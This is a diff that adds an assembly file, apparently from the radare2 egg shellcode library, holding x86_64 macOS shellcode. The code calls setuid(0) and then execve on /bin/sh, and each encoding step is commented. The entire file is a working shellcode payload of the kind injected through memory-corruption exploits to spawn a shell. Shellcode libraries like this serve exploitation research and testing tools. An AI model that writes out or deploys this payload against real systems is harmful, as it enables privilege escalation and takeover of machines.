@@ -1,0 +1,46 @@
+; x86_64 macOS execve /bin/sh shellcode with setuid(0)
+; Assembly equivalent of the bytes in libr/egg/p/sc/src/x86-osx-binsh.c
+; 
+; This shellcode first calls setuid(0) and then execve("/bin/sh", argv, NULL)
+; Uses jmp/call technique for position-independent string address
+;
+; Note: Using .byte directives for encoding-sensitive instructions
+; to match original bytes exactly (rasm2 may produce different encodings)
+
+; mov r8b, 2 - Setup syscall base
+.byte 0x41
+.byte 0xb0
+.byte 0x02
+; shl r8, 0x18 - r8 = 0x02000000
+.byte 0x49
+.byte 0xc1
+.byte 0xe0
+.byte 0x18
+; or r8, 0x17 - r8 = 0x02000017 (setuid syscall)
+.byte 0x49
+.byte 0x83
+.byte 0xc8
+.byte 0x17
+xor edi, edi                             ; edi = 0
+mov rax, r8                              ; rax = syscall number
+syscall                                  ; setuid(0)
+jmp short str_addr                       ; jump to call
+get_str:
+pop rdi                                  ; rdi = "/bin/sh" address
+add r8, 0x24                             ; r8 = 0x0200003b (execve syscall)
+mov rax, r8                              ; rax = syscall number
+xor rdx, rdx                             ; rdx = NULL (envp)
+push rdx                                 ; NULL terminator
+push rdi                                 ; argv[0] = "/bin/sh"
+mov rsi, rsp                             ; rsi = argv
+syscall                                  ; execve("/bin/sh", argv, NULL)
+str_addr:
+call get_str                             ; push return address
+; "/bin/sh" string (not null-terminated)
+.byte 0x2f  ; /
+.byte 0x62  ; b
+.byte 0x69  ; i
+.byte 0x6e  ; n
+.byte 0x2f  ; /
+.byte 0x73  ; s
+.byte 0x68  ; h
